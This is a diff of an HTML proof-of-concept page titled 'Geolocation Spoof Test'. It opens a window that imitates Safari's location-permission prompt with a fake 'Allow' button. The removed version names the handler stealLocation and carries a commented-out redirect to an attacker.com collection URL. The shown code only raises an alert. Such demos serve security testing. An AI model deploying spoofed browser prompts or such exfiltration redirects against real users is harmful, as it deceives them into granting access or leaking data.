@@ -1,66 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Attack Page</title>
+  <title>Geolocation Spoof Test</title>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <button onclick="launchSpoof()">Launch Fake Prompt</button>
+
   <script>
-    const win = window.open("about:blank", "_blank");
+    function launchSpoof() {
+      const spoofHTML = `
+        <!DOCTYPE html>
+        <html>
+          <head>
+            <title>Safari Location Prompt</title>
+            <style>
+              body {
+                font-family: -apple-system, sans-serif;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+                margin: 0;
+                background-color: #fff;
+              }
+              .box {
+                border: 1px solid #ccc;
+                padding: 20px;
+                border-radius: 12px;
+                box-shadow: 0 0 20px rgba(0,0,0,0.15);
+                max-width: 320px;
+                text-align: center;
+              }
+              button {
+                margin-top: 15px;
+                padding: 10px 20px;
+                font-size: 16px;
+                background: #007aff;
+                color: white;
+                border: none;
+                border-radius: 6px;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="box">
+              <strong>🔒 "This site would like to use your current location."</strong>
+              <br><br>
+              <button onclick="alert('Access granted! (spoofed)')">Allow</button>
+            </div>
+          </body>
+        </html>
+      `;
 
-    win.document.write(`
-      <!DOCTYPE html>
-      <html>
-        <head>
-          <title>Secure Location</title>
-          <style>
-            body {
-              font-family: -apple-system, sans-serif;
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-              align-items: center;
-              height: 100vh;
-              margin: 0;
-              background: #fff;
-            }
-            .prompt {
-              border: 1px solid #ccc;
-              padding: 20px;
-              border-radius: 8px;
-              box-shadow: 0 0 10px rgba(0,0,0,0.2);
-              max-width: 300px;
-              text-align: center;
-            }
-            .btn {
-              margin-top: 15px;
-              padding: 10px 20px;
-              border: none;
-              border-radius: 6px;
-              background: #007aff;
-              color: #fff;
-              font-weight: bold;
-              font-size: 16px;
-              cursor: pointer;
-            }
-          </style>
-        </head>
-        <body>
-          <div class="prompt">
-            <p><strong>🔒 "This site would like to use your current location."</strong></p>
-            <button class="btn" onclick="stealLocation()">Allow</button>
-          </div>
-
-          <script>
-            function stealLocation() {
-              // Fake action: Exfiltrate data / trigger real prompt / redirect
-              alert("Access granted! (Spoofed)");
-              // window.location = "https://attacker.com/collect?loc=approved";
-            }
-          </script>
-        </body>
-      </html>
-    `);
+      const blob = new Blob([spoofHTML], { type: 'text/html' });
+      const spoofURL = URL.createObjectURL(blob);
+      window.open(spoofURL, '_blank');
+    }
   </script>
 </body>
 </html>
